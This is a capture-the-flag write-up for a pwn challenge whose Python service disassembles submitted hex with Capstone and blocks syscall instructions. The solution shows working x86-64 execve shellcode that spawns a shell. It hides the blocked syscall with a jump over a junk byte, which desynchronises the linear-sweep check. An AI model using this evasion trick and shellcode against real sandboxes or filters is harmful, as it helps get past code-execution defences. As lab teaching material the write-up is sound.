# 0x0f05

**Category:** pwn  **Difficulty:** Medium  **Author:** cachegrim

> Same same but different. But I still understand only hex
> Only ex I'm interested is in your hex.

Players got `0x0f05/chal.py`. Run: `docker build -t 0x0f05 0x0f05 && docker run -p 9999:9999 0x0f05`

## Solution

`chal.py` takes hex, disassembles it with Capstone, and refuses to run it if it sees a `syscall` or `int 0x80`. Otherwise it maps it RWX and calls it.

The check is a linear sweep. The CPU follows jumps, Capstone doesn't. So put `eb 01` (jmp +1) followed by a junk `e8` byte. Capstone reads `e8` as the start of a 5 byte `call rel32` and swallows the next 4 bytes, which throws the rest of the listing out of sync, and the real `0f 05` never shows up as `syscall`. The CPU just jumps over the `e8`.

```python
shell = asm('''
    xor rax, rax
    push rax
    mov rdi, 0x68732f6e69622f2f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
''')
sc = shell[:3] + b'\xeb\x01\xe8' + shell[3:]
p.sendline(sc.hex().encode())
p.sendline(b'cat /flag.txt')
```

Full script in `0x0f05/solve.py`.

Flag is per-instance: `H7CTF{sh3llc0d3_a1nt_g0nn4_m4k3_y0u_r1ch_<8 hex>}`
